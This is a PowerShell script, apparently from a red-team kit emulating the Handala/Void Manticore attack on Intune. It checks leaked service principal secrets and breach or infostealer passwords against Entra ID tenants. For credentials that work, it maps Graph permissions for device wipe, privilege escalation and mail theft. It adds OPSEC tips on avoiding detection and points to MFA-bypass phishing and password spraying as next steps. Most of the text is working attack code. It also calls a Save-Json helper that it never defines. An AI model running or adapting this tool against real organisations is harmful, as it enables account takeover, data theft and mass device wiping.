#Requires -Version 5.1
<#
.SYNOPSIS
    Invoke-HandalaCredValidator.ps1 — Credential & Service Principal Validation
    Phase 3 of Handala/Void Manticore TTP Emulation

.DESCRIPTION
    Validates credentials discovered during Phase 1 (TruffleHog, GitHub dorks, breach databases)
    against the target Entra ID tenant. Two modes:

    Mode A — Service Principal Validation:
      Takes client_id/client_secret/tenant_id triplets found in leaked code
      and validates whether they are still live. For live SPs, maps all
      accessible Graph API permissions and identifies high-risk access
      (Intune admin, Directory write, mail access, etc.)

    Mode B — User Credential Validation:
      Takes username:password pairs from breach/infostealer data and performs
      a single OAuth2 ROPC token request per pair. NOT a spray — this is
      targeted validation of specific known credentials, not guessing.
      Reports MFA status, Conditional Access blocks, and token scopes.

    This script does NOT perform password spraying, brute force, or credential
    guessing. It only validates credentials you already possess from OSINT.

    All validated credentials are assessed for Intune/device management access
    relevance to the Handala/Stryker attack scenario.

.PARAMETER SPCredFile
    Path to JSON file containing service principal credentials to validate.
    Format: [{"client_id":"...","client_secret":"...","tenant_id":"...","source":"GitHub repo X"}]

.PARAMETER UserCredFile
    Path to file containing user credentials to validate.
    Format: one per line, username:password

.PARAMETER OutputDir
    Output directory. Default: current directory or ReconDir if provided.

.PARAMETER ReconDir
    Path to Phase 1/2 output directory. Used to inherit output location.

.EXAMPLE
    # Validate service principal secrets found by TruffleHog
    .\Invoke-HandalaCredValidator.ps1 -SPCredFile .\sp_creds.json

.EXAMPLE
    # Validate breach credentials
    .\Invoke-HandalaCredValidator.ps1 -UserCredFile .\breach_creds.txt

.EXAMPLE
    # Both modes, output to recon directory
    .\Invoke-HandalaCredValidator.ps1 -SPCredFile .\sp_creds.json -UserCredFile .\breach_creds.txt -ReconDir .\recon-target

.NOTES
    OPSEC - SP validation:   Generates one service principal sign-in log entry per attempt.
                             Most SOCs do not monitor SP sign-ins. LOW detection risk.
    OPSEC - User validation: Generates one user sign-in log entry per attempt (success or fail).
                             Failed attempts count toward Smart Lockout. MEDIUM detection risk.
                             Successful auth may trigger Identity Protection risk events.

    This script performs ONE attempt per credential. It is not a spray tool.
    If you need spray capability, use dedicated tooling (TREVORspray, o365spray, MSOLSpray).
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $false)]
    [string]$SPCredFile,

    [Parameter(Mandatory = $false)]
    [string]$UserCredFile,

    [Parameter(Mandatory = $false)]
    [string]$OutputDir,

    [Parameter(Mandatory = $false)]
    [string]$ReconDir
)

$ErrorActionPreference = "Continue"
$ProgressPreference = "SilentlyContinue"

# ============================================================
# INITIALIZATION
# ============================================================

function Write-Phase   { param([string]$M) Write-Host "`n[*] $M" -ForegroundColor Cyan }
function Write-Finding { param([string]$M) Write-Host "  [+] $M" -ForegroundColor Green }
function Write-Alert   { param([string]$M) Write-Host "  [!] $M" -ForegroundColor Yellow }
function Write-Fail    { param([string]$M) Write-Host "  [-] $M" -ForegroundColor Red }
function Write-Critical { param([string]$M) Write-Host "  [!!!] $M" -ForegroundColor Red -BackgroundColor Black }

if (-not $SPCredFile -and -not $UserCredFile) {
    Write-Host "ERROR: Provide at least one of -SPCredFile or -UserCredFile" -ForegroundColor Red
    Write-Host ""
    Write-Host "  SP creds JSON format:   [{`"client_id`":`"...`",`"client_secret`":`"...`",`"tenant_id`":`"...`",`"source`":`"...`"}]"
    Write-Host "  User creds file format: username@domain.com:password (one per line)"
    return
}

if (-not $OutputDir) {
    if ($ReconDir -and (Test-Path $ReconDir)) { $OutputDir = $ReconDir }
    else { $OutputDir = ".\credval-$(Get-Date -Format 'yyyyMMdd-HHmm')" }
}
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null

# High-value Graph API permissions — indicates Intune/directory/mail access
$criticalPermissions = @{
    # Intune — Stryker attack surface
    "DeviceManagementConfiguration.ReadWrite.All"              = "CRITICAL — Full Intune config control (deploy scripts, modify policies)"
    "DeviceManagementManagedDevices.ReadWrite.All"             = "CRITICAL — Wipe/retire/sync any managed device"
    "DeviceManagementManagedDevices.PrivilegedOperations.All"  = "CRITICAL — Remote wipe, lock, reset passcode"
    "DeviceManagementConfiguration.Read.All"                   = "HIGH — Read all Intune configs (recon for attack)"
    "DeviceManagementManagedDevices.Read.All"                  = "HIGH — Enumerate all managed devices (blast radius)"
    
    # Directory — privilege escalation
    "Directory.ReadWrite.All"                                  = "CRITICAL — Full directory CRUD"
    "RoleManagement.ReadWrite.Directory"                       = "CRITICAL — Assign Global Admin to self"
    "Application.ReadWrite.All"                                = "CRITICAL — Add creds to any app, escalate to any SP"
    "AppRoleAssignment.ReadWrite.All"                          = "CRITICAL — Self-grant any permission"
    
    # Data access
    "Mail.ReadWrite"                                           = "HIGH — Read/send mail as any user"
    "Mail.Read"                                                = "HIGH — Read mail (data exfil)"
    "Sites.ReadWrite.All"                                      = "HIGH — SharePoint/OneDrive full access"
    "Files.ReadWrite.All"                                      = "HIGH — OneDrive files full access"
    "User.ReadWrite.All"                                       = "MEDIUM — Modify user properties"
    
    # Policy — remove guardrails
    "Policy.ReadWrite.ConditionalAccess"                       = "CRITICAL — Disable Conditional Access policies"
    "Policy.Read.All"                                          = "MEDIUM — Read CA policies (recon)"
    
    # Read permissions — useful for recon
    "Directory.Read.All"                                       = "LOW — Read directory (enum users/groups/roles)"
    "User.Read.All"                                            = "LOW — Read all users"
    "Group.Read.All"                                           = "LOW — Read all groups"
    "Application.Read.All"                                     = "LOW — Read all app registrations"
    "AuditLog.Read.All"                                        = "LOW — Read sign-in/audit logs"
}

# Graph endpoints to probe for accessible permissions
$probeEndpoints = [ordered]@{
    "User.Read.All"                                      = "/users?`$top=1&`$select=id,userPrincipalName"
    "Directory.Read.All"                                  = "/directoryRoles"
    "Group.Read.All"                                      = "/groups?`$top=1&`$select=id,displayName"
    "Application.Read.All"                                = "/applications?`$top=1&`$select=id,displayName"
    "Device.Read.All"                                     = "/devices?`$top=1&`$select=id,displayName"
    "Policy.Read.All"                                     = "/identity/conditionalAccess/policies"
    "AuditLog.Read.All"                                   = "/auditLogs/signIns?`$top=1"
    "Sites.Read.All"                                      = "/sites/root"
    "DeviceManagementConfiguration.Read"                  = "BETA:/deviceManagement/deviceConfigurations?`$top=1"
    "DeviceManagementManagedDevices.Read"                  = "BETA:/deviceManagement/managedDevices?`$top=1&`$select=id,deviceName"
    "DeviceManagementScripts"                              = "BETA:/deviceManagement/deviceManagementScripts?`$top=1"
}

function Invoke-GraphProbe {
    <#
    .SYNOPSIS
        Probes a Graph API endpoint to determine if the token has access.
        Returns the HTTP status code. 200 = accessible.
    #>
    param(
        [string]$Token,
        [string]$Endpoint
    )
    
    if ($Endpoint.StartsWith("BETA:")) {
        $url = "https://graph.microsoft.com/beta" + $Endpoint.Substring(5)
    }
    else {
        $url = "https://graph.microsoft.com/v1.0" + $Endpoint
    }
    
    $headers = @{
        "Authorization"    = "Bearer $Token"
        "ConsistencyLevel" = "eventual"
    }
    
    try {
        $r = Invoke-WebRequest -Uri $url -Headers $headers -Method Get -ErrorAction Stop -TimeoutSec 15
        return [int]$r.StatusCode
    }
    catch {
        if ($_.Exception.Response) {
            return [int]$_.Exception.Response.StatusCode
        }
        return 0
    }
}

function Get-TokenClaims {
    <#
    .SYNOPSIS
        Decodes JWT access token claims without signature verification.
    #>
    param([string]$Token)
    
    $parts = $Token.Split('.')
    if ($parts.Count -lt 2) { return $null }
    
    $payload = $parts[1]
    # Fix base64url padding
    switch ($payload.Length % 4) {
        2 { $payload += '==' }
        3 { $payload += '='  }
    }
    $payload = $payload.Replace('-', '+').Replace('_', '/')
    
    try {
        $bytes = [Convert]::FromBase64String($payload)
        $json = [System.Text.Encoding]::UTF8.GetString($bytes)
        return $json | ConvertFrom-Json
    }
    catch {
        return $null
    }
}

# ============================================================
# MODE A: SERVICE PRINCIPAL VALIDATION
# ============================================================

$spResults = @()

if ($SPCredFile -and (Test-Path $SPCredFile)) {
    Write-Phase "Mode A: Service Principal Credential Validation"
    
    $spCreds = Get-Content $SPCredFile -Raw | ConvertFrom-Json
    Write-Finding "Loaded $($spCreds.Count) SP credential sets to validate"
    Write-Host ""
    
    foreach ($sp in $spCreds) {
        $clientId     = $sp.client_id
        $clientSecret = $sp.client_secret
        $tenantId     = $sp.tenant_id
        $source       = if ($sp.source) { $sp.source } else { "Unknown" }
        
        Write-Host "  Testing: $clientId (from: $source)" -ForegroundColor DarkGray
        
        $spResult = [ordered]@{
            ClientId        = $clientId
            TenantId        = $tenantId
            Source          = $source
            IsLive          = $false
            TokenAcquired   = $false
            TokenClaims     = $null
            Roles           = @()
            AccessibleAPIs  = @()
            RiskLevel       = "UNKNOWN"
            IntuneAccess    = $false
            EscalationPath  = $false
            Findings        = @()
        }
        
        # Attempt token acquisition — client credentials flow
        try {
            $tokenUrl = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
            $body = @{
                grant_type    = "client_credentials"
                client_id     = $clientId
                client_secret = $clientSecret
                scope         = "https://graph.microsoft.com/.default"
            }
            
            $tokenResponse = Invoke-RestMethod -Uri $tokenUrl -Method Post -Body $body -ErrorAction Stop
            $accessToken = $tokenResponse.access_token
            
            $spResult.IsLive = $true
            $spResult.TokenAcquired = $true
            Write-Alert "LIVE — Token acquired successfully"
            
            # Decode token claims
            $claims = Get-TokenClaims -Token $accessToken
            if ($claims) {
                $spResult.TokenClaims = [ordered]@{
                    AppId    = $claims.appid
                    TenantId = $claims.tid
                    Audience = $claims.aud
                    Roles    = $claims.roles
                    Issuer   = $claims.iss
                    Expiry   = if ($claims.exp) { 
                        [DateTimeOffset]::FromUnixTimeSeconds($claims.exp).DateTime.ToString("o") 
                    } else { "N/A" }
                }
                $spResult.Roles = if ($claims.roles) { $claims.roles } else { @() }
                
                Write-Finding "  App ID: $($claims.appid)"
                Write-Finding "  Tenant: $($claims.tid)"
                
                if ($claims.roles -and $claims.roles.Count -gt 0) {
                    Write-Finding "  Token roles: $($claims.roles.Count)"
                    foreach ($role in $claims.roles) {
                        $riskInfo = $criticalPermissions[$role]
                        if ($riskInfo) {
                            if ($riskInfo -match "^CRITICAL") {
                                Write-Critical "  ROLE: $role — $riskInfo"
                            }
                            elseif ($riskInfo -match "^HIGH") {
                                Write-Alert "  ROLE: $role — $riskInfo"
                            }
                            else {
                                Write-Finding "  ROLE: $role — $riskInfo"
                            }
                        }
                        else {
                            Write-Host "    ROLE: $role" -ForegroundColor DarkGray
                        }
                    }
                }
            }
            
            # Probe accessible Graph endpoints
            Write-Host "  Probing Graph API access..." -ForegroundColor DarkGray
            $accessible = @()
            
            foreach ($entry in $probeEndpoints.GetEnumerator()) {
                $permName = $entry.Key
                $endpoint = $entry.Value
                
                $status = Invoke-GraphProbe -Token $accessToken -Endpoint $endpoint
                
                if ($status -eq 200) {
                    $accessible += $permName
                    
                    # Check for Intune-specific access
                    if ($permName -match "DeviceManagement") {
                        $spResult.IntuneAccess = $true
                    }
                }
                
                Start-Sleep -Milliseconds 100  # Gentle throttle
            }
            
            $spResult.AccessibleAPIs = $accessible
            
            if ($accessible.Count -gt 0) {
                Write-Finding "  Accessible APIs: $($accessible.Count)"
                $accessible | ForEach-Object { Write-Host "    ✅ $_" -ForegroundColor DarkGreen }
            }
            
            # ---- RISK ASSESSMENT ----
            
            $findings = @()
            
            # Check for Intune attack path (Stryker scenario)
            $intuneWrite = $spResult.Roles | Where-Object { $_ -match "DeviceManagement.*ReadWrite|PrivilegedOperations" }
            $intuneRead  = $spResult.Roles | Where-Object { $_ -match "DeviceManagement.*Read" }
            
            if ($intuneWrite) {
                $spResult.RiskLevel = "CRITICAL"
                $findings += "SP has Intune WRITE access — can deploy scripts, modify policies, or issue wipe commands (Stryker attack vector)"
            }
            elseif ($spResult.IntuneAccess) {
                $spResult.RiskLevel = "HIGH"
                $findings += "SP has Intune READ access — can enumerate all managed devices and configurations (blast radius mapping)"
            }
            
            # Check for escalation paths
            $canEscalate = $spResult.Roles | Where-Object { 
                $_ -match "Application\.ReadWrite|AppRoleAssignment\.ReadWrite|RoleManagement\.ReadWrite" 
            }
            if ($canEscalate) {
                $spResult.EscalationPath = $true
                $spResult.RiskLevel = "CRITICAL"
                $findings += "SP can self-grant permissions — escalation to Global Admin or Intune Admin possible (Mandiant attack path)"
            }
            
            # Check for directory write
            if ($spResult.Roles -contains "Directory.ReadWrite.All") {
                if ($spResult.RiskLevel -ne "CRITICAL") { $spResult.RiskLevel = "CRITICAL" }
                $findings += "SP has full directory write — can create users, modify groups, change properties"
            }
            
            # Check for CA policy modification
            if ($spResult.Roles -contains "Policy.ReadWrite.ConditionalAccess") {
                $spResult.RiskLevel = "CRITICAL"
                $findings += "SP can modify Conditional Access policies — can remove security guardrails"
            }
            
            # Check for mail access
            $mailAccess = $spResult.Roles | Where-Object { $_ -match "Mail\." }
            if ($mailAccess) {
                if ($spResult.RiskLevel -notin @("CRITICAL")) { $spResult.RiskLevel = "HIGH" }
                $findings += "SP has mail access — data exfiltration possible"
            }
            
            # If nothing critical/high, assess as low/medium
            if ($findings.Count -eq 0 -and $accessible.Count -gt 0) {
                $spResult.RiskLevel = "MEDIUM"
                $findings += "SP has read-only access to directory objects — useful for enumeration"
            }
            elseif ($findings.Count -eq 0) {
                $spResult.RiskLevel = "LOW"
                $findings += "SP token acquired but no significant Graph access detected"
            }
            
            $spResult.Findings = $findings
            
            Write-Host ""
            Write-Host "  RISK: $($spResult.RiskLevel)" -ForegroundColor $(
                switch ($spResult.RiskLevel) {
                    "CRITICAL" { "Red" }
                    "HIGH"     { "Yellow" }
                    "MEDIUM"   { "DarkYellow" }
                    default    { "Gray" }
                }
            )
            $findings | ForEach-Object { Write-Host "    → $_" -ForegroundColor DarkGray }
        }
        catch {
            $errorMsg = $_.Exception.Message
            
            if ($errorMsg -match "AADSTS7000215") {
                Write-Fail "  DEAD — Invalid client secret (expired or rotated)"
                $spResult.Findings += "Secret is invalid/expired"
            }
            elseif ($errorMsg -match "AADSTS700016") {
                Write-Fail "  DEAD — Application not found in tenant"
                $spResult.Findings += "App registration does not exist in this tenant"
            }
            elseif ($errorMsg -match "AADSTS90002") {
                Write-Fail "  DEAD — Tenant not found"
                $spResult.Findings += "Tenant ID is invalid"
            }
            else {
                Write-Fail "  ERROR — $errorMsg"
                $spResult.Findings += "Auth error: $errorMsg"
            }
        }
        
        $spResults += $spResult
        Write-Host ""
    }
    
    # SP Summary
    $liveSPs = $spResults | Where-Object { $_.IsLive }
    $criticalSPs = $spResults | Where-Object { $_.RiskLevel -eq "CRITICAL" }
    $intuneSPs = $spResults | Where-Object { $_.IntuneAccess }
    $escalateSPs = $spResults | Where-Object { $_.EscalationPath }
    
    Save-Json "09_sp_validation" $spResults
    
    Write-Phase "SP Validation Summary"
    Write-Host "  Tested:     $($spResults.Count)"
    Write-Host "  Live:       $($liveSPs.Count)" -ForegroundColor $(if ($liveSPs.Count -gt 0) { "Yellow" } else { "Green" })
    Write-Host "  CRITICAL:   $($criticalSPs.Count)" -ForegroundColor $(if ($criticalSPs.Count -gt 0) { "Red" } else { "Green" })
    Write-Host "  Intune:     $($intuneSPs.Count)" -ForegroundColor $(if ($intuneSPs.Count -gt 0) { "Red" } else { "Green" })
    Write-Host "  Escalation: $($escalateSPs.Count)" -ForegroundColor $(if ($escalateSPs.Count -gt 0) { "Red" } else { "Green" })
}

# ============================================================
# MODE B: USER CREDENTIAL VALIDATION
# ============================================================

$userResults = @()

if ($UserCredFile -and (Test-Path $UserCredFile)) {
    Write-Phase "Mode B: User Credential Validation (Breach/Infostealer Data)"
    Write-Alert "Each attempt generates a sign-in log entry on the target tenant."
    Write-Alert "This is NOT a spray — one attempt per known credential pair."
    Write-Host ""
    
    $credLines = Get-Content $UserCredFile | Where-Object { $_.Trim() -ne "" -and $_ -match ":" }
    Write-Finding "Loaded $($credLines.Count) credential pairs to validate"
    
    # ROPC client ID — Azure PowerShell (commonly allowed through CA policies)
    $ropClientId = "1950a258-227b-4e31-a9cf-717495945fc2"
    
    foreach ($line in $credLines) {
        # Parse username:password (handle passwords with colons)
        $colonIdx = $line.IndexOf(':')
        if ($colonIdx -le 0) { continue }
        
        $username = $line.Substring(0, $colonIdx).Trim()
        $password = $line.Substring($colonIdx + 1)
        $domain = ($username -split '@')[1]
        
        Write-Host "  Testing: $username" -ForegroundColor DarkGray
        
        $userResult = [ordered]@{
            Username    = $username
            Domain      = $domain
            IsValid     = $false
            MFARequired = $false
            CABlocked   = $false
            Disabled    = $false
            LockedOut   = $false
            ErrorCode   = $null
            ErrorDetail = $null
            TokenScopes = @()
            RiskLevel   = "UNKNOWN"
            Findings    = @()
        }
        
        try {
            $tokenUrl = "https://login.microsoftonline.com/$domain/oauth2/v2.0/token"
            $body = @{
                grant_type = "password"
                client_id  = $ropClientId
                scope      = "https://graph.microsoft.com/.default openid profile"
                username   = $username
                password   = $password
            }
            
            $tokenResponse = Invoke-RestMethod -Uri $tokenUrl -Method Post -Body $body -ErrorAction Stop
            
            # If we get here, creds are valid AND no MFA/CA blocked us
            $userResult.IsValid = $true
            $userResult.RiskLevel = "CRITICAL"
            $userResult.Findings += "Valid credentials with NO MFA challenge — direct access possible"
            
            # Decode token to check scopes
            $claims = Get-TokenClaims -Token $tokenResponse.access_token
            if ($claims) {
                $userResult.TokenScopes = if ($claims.scp) { $claims.scp -split ' ' } else { @() }
                
                # Check if user has admin roles
                if ($claims.wids) {
                    # wids = well-known directory role template IDs
                    $adminRoleMap = @{
                        "62e90394-69f5-4237-9190-012177145e10" = "Global Administrator"
                        "194ae4cb-b126-40b2-bd5b-6091b380977d" = "Security Administrator"
                        "729827e3-9c14-49f7-bb1b-9608f156bbb8" = "Helpdesk Administrator"
                        "3a2c62db-5318-420d-8d74-23affee5d9d5" = "Intune Administrator"
                        "966707d0-3269-4727-9be2-8c3a10f19b9d" = "Password Administrator"
                        "fdd7a751-b60b-444a-984c-02652fe8fa1c" = "Groups Administrator"
                        "fe930be7-5e62-47db-91af-98c3a49a38b1" = "User Administrator"
                    }
                    
                    foreach ($wid in $claims.wids) {
                        $roleName = $adminRoleMap[$wid]
                        if ($roleName) {
                            $userResult.Findings += "User holds admin role: $roleName"
                            Write-Critical "  ADMIN ROLE: $roleName"
                            
                            if ($roleName -match "Global|Intune") {
                                $userResult.Findings += "STRYKER SCENARIO: This credential has direct Intune/Global Admin access without MFA"
                            }
                        }
                    }
                }
            }
            
            Write-Critical "  VALID — No MFA! Token acquired."
        }
        catch {
            $errorBody = $null
            try {
                $reader = [System.IO.StreamReader]::new($_.Exception.Response.GetResponseStream())
                $errorBody = $reader.ReadToEnd() | ConvertFrom-Json
                $reader.Close()
            }
            catch {
                # Can't parse error body — use exception message
            }
            
            $errorCode = if ($errorBody.error_codes) { $errorBody.error_codes[0] } 
                         elseif ($errorBody.error) { $errorBody.error } 
                         else { "unknown" }
            $errorDesc = if ($errorBody.error_description) { $errorBody.error_description.Split("`n")[0] }
                         else { $_.Exception.Message.Substring(0, [Math]::Min(200, $_.Exception.Message.Length)) }
            
            $userResult.ErrorCode = $errorCode
            $userResult.ErrorDetail = $errorDesc
            
            switch -Regex ($errorCode.ToString()) {
                "50126" {
                    # Invalid password
                    Write-Fail "  Invalid password"
                    $userResult.Findings += "Password is incorrect (account exists)"
                }
                "50076|50079" {
                    # MFA required
                    $userResult.IsValid = $true
                    $userResult.MFARequired = $true
                    $userResult.RiskLevel = "HIGH"
                    $userResult.Findings += "Valid credentials but MFA required — device code phishing or MFA fatigue needed"
                    Write-Alert "  VALID — Password correct, MFA required"
                }
                "53003" {
                    # Conditional Access blocked
                    $userResult.IsValid = $true
                    $userResult.CABlocked = $true
                    $userResult.RiskLevel = "HIGH"
                    $userResult.Findings += "Valid credentials but Conditional Access blocked this auth flow — try different client_id or auth method"
                    Write-Alert "  VALID — Password correct, CA policy blocked"
                }
                "50057" {
                    # Account disabled
                    $userResult.Disabled = $true
                    $userResult.Findings += "Account is disabled"
                    Write-Fail "  Account disabled"
                }
                "50053" {
                    # Account locked
                    $userResult.LockedOut = $true
                    $userResult.Findings += "Account is locked out"
                    Write-Alert "  Account locked out (Smart Lockout)"
                }
                "50034" {
                    # User not found
                    Write-Fail "  User does not exist"
                    $userResult.Findings += "Account does not exist in tenant"
                }
                "50055" {
                    # Password expired
                    $userResult.IsValid = $true
                    $userResult.RiskLevel = "MEDIUM"
                    $userResult.Findings += "Valid credentials but password expired — may still work for some auth flows"
                    Write-Alert "  VALID — Password expired"
                }
                "50158" {
                    # External security challenge (e.g., ADFS MFA)
                    $userResult.IsValid = $true
                    $userResult.MFARequired = $true
                    $userResult.RiskLevel = "HIGH"
                    $userResult.Findings += "Valid credentials, external MFA challenge (federated IdP)"
                    Write-Alert "  VALID — Federated MFA challenge"
                }
                default {
                    Write-Fail "  Error: $errorCode — $errorDesc"
                    $userResult.Findings += "Auth error: $errorCode"
                }
            }
        }
        
        $userResults += $userResult
        Start-Sleep -Milliseconds 500  # Mandatory delay between attempts
    }
    
    # User Validation Summary
    $validUsers = $userResults | Where-Object { $_.IsValid }
    $noMFA = $validUsers | Where-Object { -not $_.MFARequired -and -not $_.CABlocked }
    $mfaRequired = $validUsers | Where-Object { $_.MFARequired }
    $caBlocked = $validUsers | Where-Object { $_.CABlocked }
    
    Save-Json "10_user_validation" $userResults
    
    Write-Phase "User Credential Validation Summary"
    Write-Host "  Tested:            $($userResults.Count)"
    Write-Host "  Valid (total):     $($validUsers.Count)" -ForegroundColor $(if ($validUsers.Count -gt 0) { "Yellow" } else { "Green" })
    Write-Host "  Valid (no MFA!):   $($noMFA.Count)" -ForegroundColor $(if ($noMFA.Count -gt 0) { "Red" } else { "Green" })
    Write-Host "  Valid (MFA req):   $($mfaRequired.Count)" -ForegroundColor $(if ($mfaRequired.Count -gt 0) { "Yellow" } else { "Green" })
    Write-Host "  Valid (CA block):  $($caBlocked.Count)"
    Write-Host "  Invalid password:  $(($userResults | Where-Object { $_.ErrorCode -eq 50126 }).Count)"
    Write-Host "  Locked out:        $(($userResults | Where-Object { $_.LockedOut }).Count)"
    Write-Host "  Disabled:          $(($userResults | Where-Object { $_.Disabled }).Count)"
    
    if ($noMFA.Count -gt 0) {
        Write-Host ""
        Write-Critical "  ACCOUNTS WITH NO MFA:"
        $noMFA | ForEach-Object {
            Write-Host "    $($_.Username)" -ForegroundColor Red
            $_.Findings | ForEach-Object { Write-Host "      → $_" -ForegroundColor DarkGray }
        }
    }
    
    # Export valid credentials for Phase 4
    if ($validUsers.Count -gt 0) {
        $validUsers | ForEach-Object { $_.Username } | 
            Out-File (Join-Path $OutputDir "10_valid_creds_usernames.txt") -Encoding UTF8
    }
}

# ============================================================
# COMBINED SUMMARY
# ============================================================

Write-Phase "Phase 3 Complete — Combined Assessment"

$combinedSummary = [ordered]@{
    CompletedAt       = (Get-Date -Format "o")
    SPsTested         = $spResults.Count
    SPsLive           = ($spResults | Where-Object { $_.IsLive }).Count
    SPsCritical       = ($spResults | Where-Object { $_.RiskLevel -eq "CRITICAL" }).Count
    SPsIntuneAccess   = ($spResults | Where-Object { $_.IntuneAccess }).Count
    SPsEscalation     = ($spResults | Where-Object { $_.EscalationPath }).Count
    UsersTested       = $userResults.Count
    UsersValid        = ($userResults | Where-Object { $_.IsValid }).Count
    UsersNoMFA        = ($userResults | Where-Object { $_.IsValid -and -not $_.MFARequired -and -not $_.CABlocked }).Count
    UsersMFARequired  = ($userResults | Where-Object { $_.MFARequired }).Count
    UsersCABlocked    = ($userResults | Where-Object { $_.CABlocked }).Count
    StrykerPathExists = $false
    NextSteps         = @()
}

# Determine if Stryker-equivalent attack path exists
$strykerPath = $false

# Path 1: SP with Intune write access
if (($spResults | Where-Object { $_.RiskLevel -eq "CRITICAL" -and $_.IntuneAccess }).Count -gt 0) {
    $strykerPath = $true
    $combinedSummary.NextSteps += "CRITICAL: Live SP with Intune write access found — proceed to Script 4 for blast radius assessment"
}

# Path 2: SP with escalation capability
if (($spResults | Where-Object { $_.EscalationPath }).Count -gt 0) {
    $strykerPath = $true
    $combinedSummary.NextSteps += "CRITICAL: SP can self-grant Intune permissions — escalation to device admin possible"
}

# Path 3: User credential with no MFA on admin account
$adminNoMFA = $userResults | Where-Object { 
    $_.IsValid -and -not $_.MFARequired -and -not $_.CABlocked -and
    $_.Username -match "admin|intune|global|helpdesk|svc-"
}
if ($adminNoMFA.Count -gt 0) {
    $strykerPath = $true
    $combinedSummary.NextSteps += "CRITICAL: Admin user credential valid with no MFA — direct console access possible"
}

# Path 4: User credential valid but MFA required
if (($userResults | Where-Object { $_.MFARequired }).Count -gt 0) {
    $combinedSummary.NextSteps += "HIGH: Valid credentials with MFA — consider device code phishing (AADInternals) or AiTM (Evilginx)"
}

# Path 5: SP with read-only access
if (($spResults | Where-Object { $_.IsLive -and $_.AccessibleAPIs.Count -gt 0 -and $_.RiskLevel -notin @("CRITICAL") }).Count -gt 0) {
    $combinedSummary.NextSteps += "MEDIUM: Live SP with read access — use Script 4 for full directory enumeration"
}

if ($combinedSummary.NextSteps.Count -eq 0) {
    $combinedSummary.NextSteps += "No live credentials found — consider password spray (TREVORspray) or expanding OSINT scope"
}

$combinedSummary.StrykerPathExists = $strykerPath

Save-Json "11_phase3_summary" $combinedSummary

Write-Host ""
if ($strykerPath) {
    Write-Critical "  STRYKER-EQUIVALENT ATTACK PATH EXISTS"
}
Write-Host ""
$combinedSummary.NextSteps | ForEach-Object { 
    $color = if ($_ -match "^CRITICAL") { "Red" } elseif ($_ -match "^HIGH") { "Yellow" } else { "DarkGray" }
    Write-Host "  → $_" -ForegroundColor $color
}

Write-Host "`n[*] Output saved to: $OutputDir" -ForegroundColor Cyan
Write-Host "[*] Next: Run Script 4 (SP Enum & Intune Recon) with live SP tokens from 09_sp_validation.json`n" -ForegroundColor Cyan
